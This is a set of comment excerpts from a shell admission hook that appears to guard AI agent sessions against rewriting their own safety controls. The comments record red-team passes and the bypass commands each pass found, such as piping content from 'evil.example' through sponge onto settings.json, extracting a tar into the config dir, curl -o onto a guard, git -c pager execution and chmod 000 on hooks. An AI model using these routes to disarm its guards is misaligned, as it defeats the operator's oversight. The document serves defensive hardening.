```

## bin/admission-bash.sh, lines 1140-1142 (before this edit)

```text
Pass 14 A-src-2/3: a FILTERED find that deletes is cleanup anywhere but the config dir, where the
filter can name the guards. The spray rule's roots are / ~ $HOME only, so a find rooted at the
config dir, its bin/ or its hooks/ that deletes or runs a destructive verb is asked per segment.
```

## bin/admission-bash.sh, lines 1162-1166 (before this edit)

```text
The Playwright CLI or MCP run straight from a shell reaches the operator's
attached Chrome with none of `harbor chrome`'s verb, option and host
allowlists (harbor#835). The verb is the only way in; `node <path>` counts too.
harbor#1420: a `-c` payload (`bash -c 'bunx @playwright/cli@$P …'`) and `--package=@playwright/cli@$P`
spell the same run, so the anchor accepts a -c flag and the package may follow --package.
```

## bin/admission-bash.sh, lines 1169-1176 (before this edit)

```text
── THE APPROVAL GATE (harbor#1018, docs/design/approval-gate.md) ───────────
An `ask` rule on <cfg>/bin/gate-approve.sh is the operator's click, and an allow rule names gate-merge.sh. Rules
match TEXT, so any other spelling (sh -c, a wrapper, another path, a symlink, a copy) would reach the tool with no
prompt: a gate tool runs only as the exact command its rule names, and copying or linking one is refused. The raw
routes the gate replaces are refused in a session too. Words are judged by their position in each simple command,
so `git add`, `grep` and `cat` of these files, and prose naming them, stay allowed.
GATE_ROUTE_AWK prints EXEC (a gate tool runs), COPY (one is copied or linked), MERGE or DEPLOY (a raw route)
for each simple command, after peeling assignments, wrappers (env, xargs, find -exec) and interpreters (sh -c).
```

## bin/admission-bash.sh, lines 1255-1257 (before this edit)

```text
harbor#1420: a refusal that names a command the agent must guess re-blocks it (17 of 28 merge-raw blocks were
followed by another block). The hint is built from the refused argv, so it runs as printed; a field the argv
does not carry makes the whole hint fall back to words, never to a placeholder an agent would paste.
```

## bin/admission-bash.sh, lines 1355-1359 (before this edit)

```text
Interpreter escape hatches with a dangerous token. The flag test accepts
BUNDLED forms (python3 -Ec, node --experimental -pe): requiring the flag as
its own token missed `python3 -Ec '…'` (red-team 2026-07-24).
harbor#1420: the flat regex spans `&&` and `;`, so text naming `eval(` beside a harmless -c fired it.
The table acquits only when python's own argv is clean and every other segment is an inert text consumer.
```

## bin/admission-bash.sh, lines 1373-1385 (before this edit)

```text
MUTATING PIPE INTO xargs: THE RULE THAT WAS HERE IS GONE, ALSO PROVABLY DEAD
(harbor#280). Its trigger was byte-identical to find-xargs-spray's second
trigger 26 lines above, and its escape hatch was the SAME find-filter test with
a WEAKER clearing — find-xargs-spray additionally clears `_filtered` when the
search is rooted at / ~ $HOME or when the "filter" is universal. So its block
condition was a strict subset of a rule that runs first: every command it would
have blocked had already blocked as find-xargs-spray, and every command it would
have let through, that rule judged more strictly.

MEASURED AS WELL AS PROVED, because a subset argument over two regexes is worth
checking against the guard: `cat list | xargs chmod 777`, `find / -name x |
xargs rm -rf` and `echo /tmp/x | xargs dd of=/dev/null` all block, as
find-xargs-spray and dd-to-device (2026-08-23, installed guard).
```

## bin/admission-bash.sh, lines 1387-1404 (before this edit)

```text
── Floor self-protection via the Bash tool ─────────────────────────────────
guard-selfedit only sees Write|Edit|MultiEdit, and permissions.deny binds the
NAMED tool — so `echo {} > ~/.claude/settings.json`, `sed -i`, `cp`, `tee` or
a heredoc through Bash could rewrite settings.json or truncate a guard with
nothing in the way (red-team 2026-07-24: uncovered end-to-end). Any Bash
mutation aimed at a floor control surface is denied here.
A config-dir reference in ANY spelling. The previous "\$HOME/\.claude"
alternative was inert — inside double quotes it reached grep as an unescaped
`$` anchor — and no ./ , // or ${HOME} form was covered (red-team pass 2).
Matching on the DIRECTORY COMPONENT (…claude… or …claude-sandbox…) rather
than a literal absolute prefix covers every spelling that reaches the same
directory, including relative ones after a cd.
Matching the bare component `.claude` treated EVERY project's own .claude/
tree as a floor surface, so 'chmod +x .claude/hooks/pre-commit.sh' and
`echo {} > .claude/settings.local.json` were blocked — work this operator's
own update-config skill does, with no Write-tool workaround, while
guard-selfedit correctly ALLOWED the same file (red-team pass 5, the two
guards contradicted each other). Anchor on the ACTUAL config dirs instead.
```

## bin/admission-bash.sh, lines 1406-1413 (before this edit)

```text
THE SAME DIR, ESCAPED FOR USE INSIDE A RULE (P12-configdir-ere-injection-03).
CFG_ABS is a PATH and is compared as one by floor_seg_cwd_under /
floor_seg_operand_under; these two are the REGEX spellings, and the only
forms that may be interpolated into an ERE. An unbalanced metacharacter in
CLAUDE_CONFIG_DIR otherwise invalidates every expression it appears in, and an
invalid expression does not match — which switches the surface rules off while
the floor still verifies as installed. Rationale and the measurement are on
floor_ere_quote in library-admission.sh.
```

## bin/admission-bash.sh, lines 1415-1421 (before this edit)

```text
The live dir as a PATH, not a regex — every alternation below already names it
(escaped, which is why lint D1 does not see them) but floor_seg_cwd_under
compares resolved paths and cannot take a regex. Named here in D1's blessed
`LIVE_DIR=` idiom, and for D1's blessed reason: this is naming the live dir in
order to REFUSE writes to it, not reading state through a hardcoded path.
It stays separate from CFG_ABS because CLAUDE_CONFIG_DIR can point the guard
at a sandbox while ~/.claude is still the tree loaded into every session.
```

## bin/admission-bash.sh, lines 1426-1429 (before this edit)

```text
`~<name>/.claude` rides along with the rm fix above and for the same reason:
floor_expand_paths canonicalizes `~$(id -un)/` only, so THIS machine's login
name reached these rules and `~alice/.claude` — a second account's floor on a
shared host — reached none of them (measured at exit 0, pass 13).
```

## bin/admission-bash.sh, lines 1432-1473 (before this edit)

```text
`.helm-pins/` was named in permissions.deny but MISSING here, so the per-guard
content pins — the thing that makes B6 able to notice a gutted guard — were
rewritable by a plain shell redirect: deny binds the Write/Edit TOOLS, not a
`>` inside a Bash call. Same for the B8 instruction pin (red-team B7/B8,
B8-01/B8-08). Both are now surfaces here, where redirects are seen.
`.helm-peers/` joins the list because its contents are RENDERED INTO ANOTHER
SESSION'S SYSTEM CONTEXT (harbor#75; pass 13, P13-peer-04 fired a plant through
a plain Bash redirect at rc=0). A file that reaches a future session's prompt is
a control surface by the same argument B8 makes for the instruction trees — and
the deny layer cannot cover it, because deny binds the Write/Edit TOOLS and this
is a `>` inside a Bash call. The readers validate the value too; this stops the
write, that stops the read, and neither alone is enough.
`CLAUDE.md` JOINS THE LIST (2026-08-03), and it is the loudest omission the
floor had. It is the CONSTITUTION on this box — the one document loaded into
every session — and until now nothing stopped a session rewriting it:
admission-self-edit.sh:24 only ever sees Write|Edit|MultiEdit, `permissions.deny`
binds the named TOOL, and this guard had never heard of the file (measured:
the only `CLAUDE` matches in it were comments about READING one). So
`printf '…' > ~/.claude/CLAUDE.md` reached the file governing every future
session with nothing in the way — the same shape as the workflow-file gap
above, aimed at the rules rather than at the gate.

Its own §4 makes this the payload an injection would want most: fetched
content that rewrites the doctrine gets obeyed by every later session on the
box, and no other control notices.

BLAST RADIUS IS THE CONFIG DIR ONLY. CFG_RE anchors on `$CFG_ABS`/`$HOME/.claude`,
never on a bare `.claude` component, so a project's own `<repo>/.claude/CLAUDE.md`
and everything yard scaffolds stay writable. Verified by construction:
`$HOME/oldproj/.claude/…` does not contain the literal `$HOME/.claude`.

READS STAY OPEN. Every rule anchored on SURFACE is a WRITE shape — redirect,
cp/mv destination, tee/truncate/rm, in-place sed/perl/python, interpreters, dd,
jq-with-write. Nothing here fires on `cat`, `grep`, `git` or `diff`, and the
suite pins that: a guard that stopped an agent READING the constitution would
be a false positive against the file it is supposed to make people follow.
harbor#779 — every integrity row of contracts/control-plane-state.md and nothing else; lint F14 holds this line
to the table. The salts, the Stop-gate state, the install stamp, the judge verdict, the ledger's host
token and the defer verdict joined it: a redirect onto them was refused, and tee -a, cp and sed -i were not.
harbor#1044 review r3 #1: .helm-dispatch (the event dispatcher's rules, ledger, spend and spawn.on) is a
row; .harbor-autoship.off, the ship contract's kill switch, is not a .helm-* name and so not a row, and is
here because deleting it lifts the switch. Creating it is a terminal act too, then.
```

## bin/admission-bash.sh, lines 1475-1481 (before this edit)

```text
The config DIRECTORY is a surface in its own right. SURFACE only ever named a
FILE, so every verb writing INTO the dir with an implicit basename was
invisible: `cp /tmp/settings.json ~/.claude/` replaced settings.json (deny
57 -> 0, hooks gone) and `mv ~/.claude/bin ~/.claude/bin.off` unhooked the
whole floor — both proven end-to-end (red-team pass 5).
harbor#772 — deploy snapshots: deploy-restore.sh restores from backups/deploy-*/config.tgz, and a snapshot
carries its own pins, so a rewritten one restores a weakened floor. Top level only, never `*backups*`.
```

## bin/admission-bash.sh, lines 1484-1488 (before this edit)

```text
NOTE: no bare `./settings.json` alternative. It had no config-dir anchor, so
any project's root settings.json (VS Code, Jekyll, .NET…) was protected —
while `settings.json`, `app/settings.json` and the Write-tool spelling all
passed (red-team pass 4, false positive). The absolute/`.claude`-component
spellings below cover the real surfaces.
```

## bin/admission-bash.sh, lines 1489-1507 (before this edit)

```text
CI WORKFLOW FILES ARE A SURFACE TOO (harbor#88). `permissions.deny` carries
`Edit(**/.github/workflows/**)`, which — per the permissions reference D4 cites
— covers every file-EDITING tool, so the issue's "an agent that reaches for
Write is not stopped" does not hold: Write(path) entries are inert and were
deliberately removed. What the issue gets right is the half nobody covered.
Deny binds TOOLS. A heredoc, a `>>`, a `sed -i` or a `cp` through Bash reaches
the same file and no control saw it — measured 2026-08-02, the string
"workflow" appeared nowhere in this guard.

It matters more than the usual half-covered surface because this one protects
THE GATE THAT JUDGES THE AGENT. Its whole purpose is that an agent cannot
quietly widen what CI accepts, and a bypass that needs nothing more exotic than
a different tool is not much of a wall.

Adding it to SURFACE rather than writing new rules is deliberate: every verb
family already anchored on SURFACE — redirect, cp/mv destination, tee/truncate/
rm, in-place sed/perl/python, interpreters, dd, jq-with-write — starts covering
workflow files in the same commit, instead of a new list that drifts from the
old one. READS stay untouched: no rule here fires on `cat`, `grep` or `git`.
```

## bin/admission-bash.sh, lines 1509-1525 (before this edit)

```text
P13-fs-05 (harbor#94) — THE bin/ ARM CARRIED A NAME ENUMERATION AND hooks/ DID
NOT, so two directories with the same job were protected two different ways.
The arm read `bin/+[.a-z/]*(guard-|floor-)`: a file under <cfg>/bin was a
control surface only if its BASENAME started with `guard-` or `floor-`. So
`echo x > <cfg>/bin/context-resolve.sh` exited 0 — and context-resolve.sh is
wired at SessionStart AND at PostToolUse(Write|Edit|MultiEdit|NotebookEdit),
which makes it arbitrary code executing on every file edit, reached through
the floor's own hook wiring. annotate-web.sh, worklog-push.sh and memory.sh
were writable for the same reason.

The fix DELETES the enumeration rather than extending it (harbor#94's fourth
Done-when: replace a list with a shape, never add four more words). The shape
was already in this same expression one alternative to the right — `hooks/+`
protects its directory wholesale — so `bin/+` makes the two read alike. There
is nothing under <cfg>/bin a session may write through Bash; the installers
that legitimately write there run from the operator's terminal, and the reads
stay allowed because harbor#107's veto sits downstream of this pattern.
```

## bin/admission-bash.sh, lines 1526-1529 (before this edit)

```text
harbor#1181 — the observability ledgers are the record of what the floor decided, so a session that can append to
them can forge that record (case cfg280 expected `date >> <cfg>/MEMORY/OBSERVABILITY/x.jsonl` to walk). Every
write verb is now refused under MEMORY/OBSERVABILITY, prefix-matched; the rest of MEMORY stays session-writable.
Only hooks write there, and a hook is never a Bash call. Same-uid accident guard only: docs/design/telemetry.md.
```

## bin/admission-bash.sh, lines 1532-1533 (before this edit)

```text
harbor#776 — `cd ~ && echo {} > .claude/settings.json` named no surface. The fold re-spells each
segment a cd points into a config dir, and every rule below reads it beside the raw one.
```

## bin/admission-bash.sh, lines 1552-1569 (before this edit)

```text
── harbor#107 · A SINK PROGRAM'S NAME IS NOT A SINK ────────────────────────
The two sink rules below are FLAT regexes over the whole command, so they fire
on the WORD wherever it lands — including as a search term handed to something
that will never write. Measured on the live box 2026-08-03, minutes after the
rule deployed:
    /usr/bin/grep -c sponge <a guard file>   → BLOCKED as mutate-aimed-surface
    /usr/bin/grep -c hello  <the same file>  → allowed
Same command, same path, same read-only intent; only the searched-for word
differs. It fires hardest on AUDITING THE FLOOR — reading a guard to confirm
the rule you just shipped — and the workaround the operator found was to
search for `spon.e`, which nobody will remember. §2.11: a false positive is a
defect, because a guard that blocks ordinary work gets switched off.

NOT A FLAT INERT LIST — harbor#90 records why that cannot work: inertness is
RULE-DEPENDENT, and a command that is inert for a write rule can be a live
channel for an egress rule. So this veto is scoped to the write-sink rules
alone and consults the segment table, exactly as admission-egress.sh's
seg_all_inert does for its own rule.
```

## bin/admission-bash.sh, lines 1571-1588 (before this edit)

```text
`ls` (harbor#788): it opens nothing for writing, and outflag's bundle read made
macOS `ls -lo <surface>` (file flags) look like `-o <surface>`.
ABSENT ON PURPOSE: sed, awk, perl, python, jq, tee, sponge, dd — every one of
them can open a file for writing, which is the whole claim this list makes.
An UNKNOWN command word is the safe case: it fails to match, the veto is
withdrawn, and the flat rule decides exactly as it does today.
NOT EXTENDED FOR find, and that is a measured decision rather than an omission
(P13-fs-06). harbor#107's false positive does arrive through the substitution
channel — `find <cfg>/bin -name '*.sh' -exec /usr/bin/grep -c sponge {} \;`,
reading the floor to check the floor, with `sponge` landing BEFORE the surface
once the placeholder resolves. The first fix for it added `find` here, on the
argument that find writes nothing on its own account and the -exec child now
answers for itself. It worked, and then it was DEAD: the flat line the
normalizer emits for a find child follows the DATA variant's own message model,
so a grep child emits no flat line at all and there was nothing left for this
arm to veto. Breaking it changed no assertion in either suite. Shipping a
mechanism no test can distinguish is how a file acquires rules nobody can
safely touch, so it is gone and the veto is exactly what it was.
```

## bin/admission-bash.sh, lines 1589-1631 (before this edit)

```text
── harbor#164 · A READ-ONLY git SUBCOMMAND IS A READER ─────────────────────
`git` cannot go in $SEG_NOWRITE — `git checkout <path>` overwrites a working
tree — so every git segment withdrew the veto and `git grep -n <interpreter>
-- <surface>` blocked as interpreter-at-surface. Measured 2026-08-22, one
command apart:
    git grep -n <an interpreter name> -- <a workflow>   BLOCKED
    git grep -n hello                 -- <the same>     allowed
Reading the gate that judges you, refused because of the word searched for.

THE COMMENT THIS REPLACES ASSERTED SOMETHING FALSE, and that is why the
strictness was worth nothing. It read: "git is not in $SEG_NOWRITE and must
not be, because `git checkout <surface>` writes, so SINK_RO stays 0 and that
read stays blocked." Probed the same day, every one exit 0:
    git checkout <a workflow>              ALLOWED
    git checkout -- <a workflow>           ALLOWED
    git restore <a workflow>               ALLOWED
    git checkout HEAD~5 -- <a workflow>    ALLOWED
The floor never modelled a git write at all — line 501 above says so outright
("no rule here fires on cat, grep or git"). So the rule paid a false positive
on reads to protect against a write it does not catch. Removing the false
positive costs exactly nothing that existed. The git-write hole is real and is
NOT fixed here: it widens the floor's scope to a verb family it has never
covered, which is the operator's call and not a side effect of a false-positive
ticket. Tracked separately.

THE SUBCOMMAND, PARSED CONSERVATIVELY, AND ANY DOUBT MEANS NOT READ-ONLY.
git's global flags may precede it (`git -C /tmp grep …`), so the subcommand is
the first argument that is neither a flag nor the value of a value-taking
global flag. An unrecognised shape falls through to the slow, correct path.

-c IS REFUSED OUTRIGHT. `git -c core.pager='<command>' grep …` and `git -c
alias.x='!<command>' x` turn a read subcommand into arbitrary execution, so a
segment carrying -c, --config-env or --exec-path is never read-only however
innocent its subcommand looks.

MEASURED REDUNDANT TODAY, AND KEPT DELIBERATELY. Removing this line changes no
assertion in floor-test (1452 passed, 0 failed): the loop below skips -c as a
flag and does NOT skip its value, so the subcommand resolves to
`core.pager=<command>` and misses the list anyway. It becomes load-bearing the
moment somebody adds -c to the value-taking globals beside -C — which is the
obvious correctness fix for that parse and would silently open the bypass. The
same reasoning the plutil rule records for its own $SINK_RO gate: being right
by accident is not a property to rely on twice.
```

## bin/admission-bash.sh, lines 1632-1643 (before this edit)

```text
ONE PARSE, TWO READERS (harbor#265). The subcommand resolution below used to
live inside _git_seg_is_ro, and the git-write rule further down needs exactly
the same answer. Two copies of a conservative parser is the shape that drifts:
the read side would gain a global flag and the write side would not, and the
gap between them is a bypass nothing tests for. So it resolves once and both
read the result. It sets variables rather than printing, because printing means
a command substitution, which means a subshell fork PER GIT SEGMENT on the hot
path — and P12-perf-04 is red at 10s, where a timed-out hook fails OPEN.

CONTRACT: sets GIT_SUBCMD (the subcommand, '' when none resolves) and
GIT_SEGARGS (the segment's arguments, one per line). Both are outputs; neither
caller may assume anything else survives the call.
```

## bin/admission-bash.sh, lines 1652-1662 (before this edit)

```text
`-c <k>=<v>` and `--config-env <k>=<v>` put their VALUE in its own token,
and the loop above skips the flag but not the value — so the subcommand
used to resolve to `core.pager=id` and match no list. That is harmless on
the READ side, where the -c refusal three lines below is an explicit grep
over the args and does not depend on this parse at all. It was NOT
harmless on the write side: `git -c x=y checkout <surface>` resolved to
`x=y`, missed the write set, and walked straight past harbor#265's rule.
Skipping key=value closes that without skipping a generic next token —
the widening the comment below warns about, which WOULD move the -c
refusal from redundant to load-bearing. No git subcommand contains `=`,
so nothing legitimate is skipped here.
```

## bin/admission-bash.sh, lines 1683-1690 (before this edit)

```text
THE FAST PATH IS UNCHANGED AND STILL RUNS FIRST — one grep over every command
word, deciding the overwhelming majority of invocations. That ordering is not
tidiness: the first cut of the git exemption looped per segment with two forks
apiece, and floor-test's P12-perf-04 turned red — an 8KB payload took 10s,
past the hook timeout, and **a hook that times out fails OPEN**. A
false-positive fix that disables the guard on large input is a worse bug than
the false positive. Per-segment work is now reached only when git is the
reason the fast path failed, which is rare and bounded by the git segments.
```

## bin/admission-bash.sh, lines 1700-1708 (before this edit)

```text
AN OUTPUT REDIRECT ONTO A SURFACE WITHDRAWS THE VETO. `grep x f >
<surface>` writes even though no verb here does. redirect-floor-surface
already blocks that and runs ABOVE this block, outside the veto — this is
belt and braces, and the tests pin both.

SCOPED TO THE TARGET, not to "a redirect exists". Withdrawing on ANY output
redirect puts the false positive straight back: `grep -c sponge <surface> >
/tmp/out` is the same read with its output saved, and it would block again
with the same wrong rule id.
```

## bin/admission-bash.sh, lines 1717-1767 (before this edit)

```text
── harbor#265 · git RESTORES A CONTROL SURFACE AND NO RULE FIRED ────────────
Measured 2026-08-22 and re-measured 2026-08-23 against the installed guard,
every one exit 0 — ALLOWED:
    git checkout <a workflow>              git restore <a workflow>
    git checkout -- <a workflow>           git checkout HEAD~5 -- <a workflow>
while a plain redirect onto the same path blocks. `.github/workflows/` is in
$SURFACE precisely because an agent must be able to READ CI and must not be
able to CHANGE it, and `git checkout` changes it from the index or any commit.
The comment at the top of this section says so outright — "no rule here fires
on cat, grep or git" — which reads as a scoping decision about READS, and is
why the write gap never looked like a gap.

PATH-SCOPED, NEVER VERB-SCOPED, and that is the whole safety argument. A rule
on the verb would fire on `git checkout main` — an ordinary branch switch, many
times an hour — and §2.11 is explicit that a guard which blocks ordinary work
gets switched off, after which it protects nothing. So the surface must appear
in ARGUMENT position in the same segment. Every one of these stays allowed and
each is pinned in the suite: git checkout main · git checkout -b <x> ·
git switch main · git restore <an ordinary path> · git checkout HEAD~1 --
README.md · git status · git grep -n hello -- <a workflow>.

THREE SUBCOMMANDS, AND THE LIST IS SHORT ON PURPOSE. checkout, restore and
checkout-index write the path they are GIVEN, so a path-scoped rule can see
them. Deliberately excluded, each because including it would add a rule that
cannot fire — which is harbor#280's complaint, and adding a fourth instance of
it while fixing the third would be its own defect:
  • `switch`   cannot restore a file at all; it takes a branch.
  • `apply`    writes the paths INSIDE the patch, never its argument. A surface
               in argument position there is the patch being READ, so a rule
               would invert a read into a write — a false positive, not cover.
  • `read-tree` writes the index, not a named working-tree path.

WHAT THIS DOES NOT CATCH, ENUMERATED RATHER THAN PAPERED OVER. Each restores or
destroys a surface WITHOUT NAMING ONE, so no path-scoped rule can ever see it,
and a reader who believes otherwise is worse off than one told the truth:
    git checkout -- .        git stash pop        git reset --hard
`git clean -fdx` is the one member of that family already covered, and not here
— admission-destroy.sh decides it `ask` (floor-verify --live, 2026-08-23).

THE -c BYPASS IS CLOSED BY PARSING, NOT BY SUSPICION, and the first cut of this
rule got that wrong in a way worth recording. It treated any segment carrying
-c / --config-env / --exec-path as a write, on "any doubt means write" grounds.
Measured against pristine main, that BLOCKED
    git -c core.pager=id grep -n hello -- <a workflow>
which main ALLOWS — a read, newly refused. That is verbatim the harbor#164
false positive this file paid to remove three commits ago, re-introduced while
closing a hole two sections above it. The cause was the parse, so the parse is
what got fixed (see *=* in _git_seg_subcmd); `git -c x=y checkout <surface>`
now resolves to `checkout` and blocks on the write verb like any other, and no
read changes verdict. `-c` as an arbitrary-execution channel is real, applies
to every git subcommand surface or not, and is NOT this rule's business.
```

## bin/admission-bash.sh, lines 1770-1778 (before this edit)

```text
harbor#265 + harbor#804. Two writes a redirect rule cannot see:
  1 a checkout/restore/checkout-index whose PATHSPEC names a surface (harbor#265), and
  2 a working-tree write (checkout/switch/restore/checkout-index, reset --hard/--merge/--keep,
    clean -f, stash pop/apply/push) whose EFFECTIVE TREE is the config dir or a surface subtree,
    reached by a `cd`/`pushd`, `-C`, `--work-tree` or `--git-dir` — a relative pathspec or a
    whole-tree verb then rewrites the floor without ever naming it (harbor#804).
The cd chain is folded exactly as floor_seg_cwd_under folds it; `-C`/`--work-tree` move git on
top of that. Read subcommands (status/log/diff/show) and a write in a PROJECT tree stay allowed;
an unknown location (no cd, no -C) is fail-open, like every fold here.
```

## bin/admission-bash.sh, lines 1894-1903 (before this edit)

```text
The `case` gate is a shell builtin, so a command with no `git` in it anywhere
costs ZERO extra forks — the ordering discipline seg_all_nowrite records above,
for the same reason: this file runs on every Bash call in every session.
THE `;;` GOES ON ITS OWN LINE, and that is lint F5, not taste. F5 joins
backslash continuations and then requires the call to END at its `<rule>.<shape>`
id, allowing at most one `;`. A case arm closes with `;;`, so writing the call
inline inside the arm made F5 read this site as carrying NO id — a rule that
fires and cannot be counted, which is the condition harbor#41 exists to end.
Adapting the call site is the fix; widening F5 to accept `;;` would have been
weakening the gate to fit the code.
```

## bin/admission-bash.sh, lines 1928-1934 (before this edit)

```text
cp/mv/install/rsync: only a surface in DESTINATION position is a mutation.
Copying a surface OUT is a backup — the first step of the operator's own
workflow — and blocking it was pure friction (self-found after pass 5). The
destination is the LAST argument, so match a surface that runs to the end of
its segment. The trailing [^[:space:];&|]* matters: SURFACE stops at the
`guard-` prefix, so without it `cp /dev/null <cfg>/bin/admission-bash.sh` did not
match at all — which is how this fix first broke three pinned blocks.
```

## bin/admission-bash.sh, lines 1938-1955 (before this edit)

```text
`sponge` BELONGS WITH tee, and its absence was the widest hole this file has
had. moreutils' sponge reads stdin to completion and then WRITES ITS ARGUMENT —
it is `tee` with the truncation moved to the end, and it was named nowhere
except inside the jq rule, which could only ever see it when a surface appeared
BEFORE it in the pipeline. So a surface named only AFTER sponge was invisible.
Measured 2026-08-03 at bbaa8d2, every one exit 0:
  jq -n '{}' | sponge ~/.claude/settings.json
  cat /tmp/evil.json | sponge ~/.claude/settings.json
  sponge ~/.claude/settings.json < /tmp/evil.json
  printf x | sponge ~/.claude/.helm-pins/admission-bash.sh.sha256
  curl -s https:\/\/evil.example/s.json | sponge ~/.claude/settings.json
The last one is the one that matters: REMOTE CONTENT straight onto the deny
list, past the pipe-to-shell rules — because sponge is not a shell, and past
redirect-floor-surface — because there is no redirect. The fourth rewrites the
content pin that is how B6 notices a gutted guard.

It costs nothing: `| sponge /tmp/scratch.json` stays allowed, because this rule
fires on the SURFACE, not on the verb.
```

## bin/admission-bash.sh, lines 1961-1964 (before this edit)

```text
P13C-4 — 'chmod 000 <cfg>/bin' makes every hook fail to start, and a hook that cannot start fails OPEN.
The surface rule above needs a file or a trailing `/`, so the bare directory, the config dir itself and
any directory above it ('chmod 000 ~') walked. Any mode, any owner: no permission change on these is
a session's to make, and no -R is needed to lock a directory.
```

## bin/admission-bash.sh, lines 1976-2021 (before this edit)

```text
── harbor#196 / P13-fs-03 · AN OUTPUT-DESTINATION FLAG WHOSE VALUE IS A ──────
── SURFACE ───────────────────────────────────────────────────────────────────
The last pass-13 critical, and the narrowest remaining path by which a session
disarms its own floor. Measured against the live guards on 2026-08-16, with
the redirect spelling of the same write blocking beside it:

    curl -sfL <url> -o  <cfg>/bin/admission-bash.sh     allow      ← remote payload
    sort /tmp/evil  -o  <cfg>/bin/admission-bash.sh     allow
    openssl enc -in /tmp/evil -out <cfg>/bin/…      allow
    echo x >            <cfg>/bin/admission-bash.sh     BLOCK      ← control

`curl` and `wget` were named in this file only inside fetch-then-EXECUTE rules
— pipe-to-shell, `curl -o p && sh p`, process substitution. A fetch that
merely WRITES a remote payload onto a guard and never executes it matched
nothing, and B6 would report the altered guard only at the NEXT SessionStart:
detection, never containment, which docs/explanation/admission-baseline.md states in those words.

NO VERB IS NAMED, and that is the whole design (harbor#196, and harbor#94's
fourth Done-when — replace a list with a shape, never add four more words).
The shape is `an output-destination flag whose value is a surface`, which
catches `gcc -o`, `ld -o`, `objcopy -o`, `plutil -o`, `xz -o`, `ffmpeg -o` and
whatever ships next, without this file ever learning their names. A `curl`
rule would have been obsolete the day `sort -o` was tried.

TWO THINGS KEEP READS OPEN, and both are load-bearing:
  • $SINK_RO — harbor#107's veto. `grep -o <guard file>` searches for that
    path as a PATTERN; grep is in $SEG_NOWRITE, so the veto stands the whole
    block down and the read that audits the floor keeps working. That false
    positive is not hypothetical here: `-o` is grep's own flag.
  • POSITION — floor_seg_flagval asks whether the surface is the VALUE of the
    flag, not whether it appears in the segment. `curl <url> -o /tmp/x` and
    `cat <cfg>/bin/admission-bash.sh` both stay allowed for that reason.

THE FLAG LIST IS A SPELLING TABLE, NOT A VERB LIST. It enumerates how the
UNIX world spells "write your output here" — which is a closed set that has
been stable for decades — rather than which programs do it, which is not.
`-O` earns its place from wget; curl's `-O` takes no value, so the token after
it is a URL and matches no surface.

DELIBERATELY ABSENT, each for a reason that would otherwise be re-discovered
as a false positive: `--file` and `-f` are READ flags almost everywhere they
appear (`grep --file=patterns`, `awk -f prog`, `make -f`); `-w` is curl's
format string and grep's word-match, neither a path; `-of` is ffmpeg's output
FORMAT, not a destination. 'dd of=' is left to the flat dd rule above rather
than added here, because `of` is a bare word and would match a literal
argument spelled `of` in any segment — the test below pins that dd still blocks.
```

## bin/admission-bash.sh, lines 2027-2029 (before this edit)

```text
P13C-5 — the DIRECTORY spelling of the same flag: `curl --output-dir <cfg>/bin -O <url>/admission-bash.sh` and
`wget -P <cfg>/bin <url>` name only the directory, and the file comes from the URL. `-P` is wget's alone;
the long spellings are unambiguous in any tool (`cp --target-directory` included).
```

## bin/admission-bash.sh, lines 2035-2054 (before this edit)

```text
ARCHIVE EXTRACTORS write arbitrary paths under a root given by a FLAG, so no
destination-position rule sees them and no verb list contained them. Pass 10
rated this critical and proved it: `tar -x -C ~/.claude -f evil.tar` replaces
any floor surface, and `unzip -d`, `patch -d`, `cpio -D` and `ditto` do the
same. tar needs an explicit extract flag — `tar -cf backup.tar ~/.claude` only
READS the dir and must keep working, which is why the verb alone is not enough.
COMMAND POSITION, not "the word appears somewhere". Pass 11 broke the first
cut of this rule in both directions at once:
  • `tar xzf /tmp/evil.tgz -C ~/.claude` — the DOMINANT tar spelling — walked
    past it, because the flag group demanded a leading dash (critical), while
    `tar -x -C …` was blocked. A rule that catches only the less common
    spelling of the same command is not a rule.
  • and `grep -n patch ~/.claude/CLAUDE.md`, `grep -rn patching ~/.claude/skills`
    and a commit message mentioning "the patch procedure for ~/.claude/skills"
    were all BLOCKED as extraction, because `patch` is an ordinary English
    word and the verb was matched anywhere in the segment (high FP).
One anchor fixes both: the verb has to START a command.
$CMDPOS is defined ONCE, with the scheduler rules above — harbor#92 needed the
same anchor for the same reason, and two assignments of one anchor is two
places for it to drift apart.
```

## bin/admission-bash.sh, lines 2055-2076 (before this edit)

```text
── harbor#111 · -O IS NOT AN EXTRACTION, AND THE FLAT FORM HAS TO KNOW IT ───
`tar xzOf <archive> <member>` writes the member to STDOUT and creates no file.
The segment path already lets it through; the FLAT path could not, and the flat
path is the only one that runs when the tokenizer bails — a long multi-line
compound, a command substitution, an oversized payload. So the veto went
missing exactly on the commands doing real work, and reading the floor to
CHECK the floor blocked three times on the live box (same family as #107).

THE ANCHOR IS THE WHOLE FIX. The spelling that looks obvious —
`-?[a-zA-Z]*O[a-zA-Z]*` anywhere in the segment — is a HOLE: it matches any
all-letters operand carrying an O, so `tar xf evil.tgz -C <cfg> NOTES` would
read as outbound on the strength of a MEMBER NAME. This variant is only ever
used immediately after the tar verb, where the token
is tar's mode bundle and an operand cannot appear. A member name is never
first, so the cloak has nowhere to stand.

Uppercase O only. GNU tar's `-o` in extract mode is no-same-owner, not stdout.
`--to-stdout` needs no arm here: it never matches this bundle shape, so it
falls through unmatched, which is the same allow by a different route. The
residual is `tar -xf a.tgz --to-stdout -C <cfg>` — bundle first, flag later —
which still blocks. That is a false positive on an unusual spelling of a read,
and it fails SAFE; the reverse would be a bypass.
```

## bin/admission-bash.sh, lines 2078-2107 (before this edit)

```text
MIGRATED TO ARGV, 2026-07-25 (B-rewrite stage 2). This rule is the reason the
rewrite happened, so it is the first one moved. Its flat form needed a
hand-built command-position anchor (CMDPOS), a length-bounded flag bundle, and
a `[^;&|]*` span to reach the operand — three approximations, each of which
broke once. Against argv none of them exist:

  was: "${CMDPOS}(tar|…)${TAR_X}[^;&|]*(${CFG_RE}|${CFGDIR_RE}…)"
  now: a segment whose COMMAND is tar, with an extract flag among its ARGS,
       and an argument (or redirect target) inside the config dir.

What that buys, concretely:
  • `tar xzf e.tgz -C ~/.claude` and `tar -x -C ~/.claude -f e.tar` are the
    same rule now. The dash was never the point; it was an artifact of having
    to find the flag by looking left of a space.
  • `grep -n patch ~/.claude/CLAUDE.md` cannot match: `patch` is an ARGUMENT
    of grep, and the rule asks about commands. The old rule blocked it, and
    also blocked a commit message that merely said "the patch procedure".
  • `tar -tf a.tar; cp x ~/.claude` cannot match either. The old `[^;&|]*`
    span stopped at a separator by hand; here the two halves are simply
    different segments, and floor_seg_has requires ONE segment to satisfy all
